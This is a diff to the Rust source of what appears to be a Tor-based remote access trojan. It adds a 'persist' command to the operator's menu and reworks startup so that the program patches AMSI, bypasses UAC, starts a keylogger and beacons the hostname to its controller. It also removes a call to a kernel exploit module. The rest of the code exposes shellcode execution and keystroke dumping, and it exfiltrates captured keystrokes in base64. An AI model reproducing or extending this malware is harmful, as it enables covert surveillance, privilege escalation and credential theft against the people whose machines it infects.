@@ -2,14 +2,11 @@
 pub mod uac_bypass;
 #[cfg(target_os = "windows")]
 mod amsi_patch;
-#[cfg(target_os = "windows")]
-pub mod kernel_exploit;
 pub mod persist;
 pub mod keylogger;
 pub mod portscanner;
 #[cfg(target_os = "windows")]
 use is_elevated::is_elevated;
-
 
 use arti_client::{TorClient, DataStream};
 use arti_client::config::TorClientConfigBuilder;
@@ -117,21 +114,12 @@ fn take_screenshot_base64() -> anyhow::Result<String> {
 }
 
 
-/// Build prompt string
-pub fn build_prompt() -> String {
-    let user = std::env::var("USER")
-        .or_else(|_| std::env::var("USERNAME"))
-        .unwrap_or_else(|_| "unknown".into());
+const RESPONSE_DELIM: &str = "\n.\n";
 
-    let host = gethostname()
+fn get_hostname() -> String {
+    gethostname()
         .into_string()
-        .unwrap_or_else(|_| "host".into());
-
-    let cwd = std::env::current_dir()
-        .map(|p| p.display().to_string())
-        .unwrap_or_else(|_| "?".into());
-
-    format!("{}@{} [{}] >> ", user, host, cwd)
+        .unwrap_or_else(|_| "unknown".into())
 }
 
 #[cfg(target_os = "windows")]
@@ -215,6 +203,7 @@ Available commands:
     `shellcode [file]`=>\tExecute shellcode from file
     `uac [exe_path]`=>\tRun elevated command on Windows (cmstp)
     `uac2 [exe_path]`=>\tRun elevated command on Windows (slui)
+    `persist`=>\tApply persistence on target
     `keylogger_start`=>\tStart keylogger in background
     `keylogger_stop`=>\tStop keylogger
     `keylogger_dump`=>\tDump and clear buffered keystrokes
@@ -329,6 +318,11 @@ Available commands:
             {
                 Ok(b"uac2 not supported on this OS\n".to_vec())
             }
+        }
+
+        "persist" => {
+            let _ = persist::persist(false);
+            Ok(b"Persistence applied\n".to_vec())
         }
 
         "keylogger_start" => {
@@ -474,7 +468,9 @@ pub async fn read_loop(stream: DataStream) -> Result<bool> {
     let mut dl_filename: Option<String> = None;
     let mut dl_data: String = String::new();
 
-    writer.write_all(build_prompt().as_bytes()).await?;
+    let hostname = get_hostname();
+    writer.write_all(hostname.as_bytes()).await?;
+    writer.write_all(b"\n").await?;
     writer.flush().await?;
 
     let mut keylog_tick = tokio::time::interval(Duration::from_secs(60));
@@ -519,7 +515,7 @@ pub async fn read_loop(stream: DataStream) -> Result<bool> {
                             fs::write(&fname, &raw)?;
                             let msg = format!("Wrote data to {}\n", fname);
                             writer.write_all(msg.as_bytes()).await?;
-                            writer.write_all(build_prompt().as_bytes()).await?;
+                            writer.write_all(RESPONSE_DELIM.as_bytes()).await?;
                             writer.flush().await?;
                             continue;
                         }
@@ -528,7 +524,7 @@ pub async fn read_loop(stream: DataStream) -> Result<bool> {
                     }
 
                     if line.is_empty() {
-                        writer.write_all(build_prompt().as_bytes()).await?;
+                        writer.write_all(RESPONSE_DELIM.as_bytes()).await?;
                         writer.flush().await?;
                         continue;
                     }
@@ -549,7 +545,7 @@ pub async fn read_loop(stream: DataStream) -> Result<bool> {
                     }
                 }
 
-                writer.write_all(build_prompt().as_bytes()).await?;
+                writer.write_all(RESPONSE_DELIM.as_bytes()).await?;
                 writer.flush().await?;
                 }
             }
@@ -558,7 +554,7 @@ pub async fn read_loop(stream: DataStream) -> Result<bool> {
                     let data = keylogger::dump_and_clear();
                     if !data.is_empty() {
                         let encoded = general_purpose::STANDARD.encode(data.as_bytes());
-                        let msg = format!("[keylog] {}\n{}", encoded, build_prompt());
+                        let msg = format!("[keylog] {}\n{}", encoded, RESPONSE_DELIM);
                         if writer.write_all(msg.as_bytes()).await.is_err() {
                             return Ok(false);
                         }
@@ -605,48 +601,30 @@ pub async fn netclient_run(config: ClientConfig) -> Result<()> {
     Ok(())
 }
 
-#[cfg(target_os = "windows")]
-const IS_DLL:bool = true;
-
 async fn netclient_impl() -> c_int {
     #[cfg(target_os = "windows")]
     amsi_patch::amsi_patch();
 
     #[cfg(target_os = "windows")]
-    let exe_path = match std::env::current_exe() {
-        Ok(p) => p,
-        Err(_) => return 1,
-    };
-
-    #[cfg(target_os = "windows")]
-    let exe_str = exe_path.to_string_lossy().to_string();
-
-    #[cfg(target_os = "windows")]
     if !is_elevated() {
-        unsafe {
-            kernel_exploit::exploit();
-        }
+        let exe_path = match std::env::current_exe() {
+            Ok(p) => p,
+            Err(_) => return 1,
+        };
+        let exe_str = exe_path.to_string_lossy().to_string();
         let marker = std::env::temp_dir().join("art1rat_uac.tmp");
         let _ = fs::write(&marker, b"1");
         uac_bypass::elevate_uac(&exe_str);
         sleep(Duration::from_secs(5)).await;
-        if marker.exists() {
-            let _ = fs::remove_file(&marker);
-        } else {
-            return 1;
+        if !marker.exists() {
+            std::process::exit(0);
         }
-    }
-    #[cfg(target_os = "windows")]
-    {
+        let _ = fs::remove_file(&marker);
+    } else {
         let marker = std::env::temp_dir().join("art1rat_uac.tmp");
         let _ = fs::remove_file(&marker);
-        let _ = persist::persist(IS_DLL);
-        if !is_elevated(){
-            sleep(Duration::from_secs(61)).await;
-        }
     }
-    #[cfg(target_os = "linux")]
-    persist::persist(false);
+
     keylogger::start();
     sleep(Duration::from_millis(100)).await;
     let _ = netclient_run(ClientConfig::default()).await;
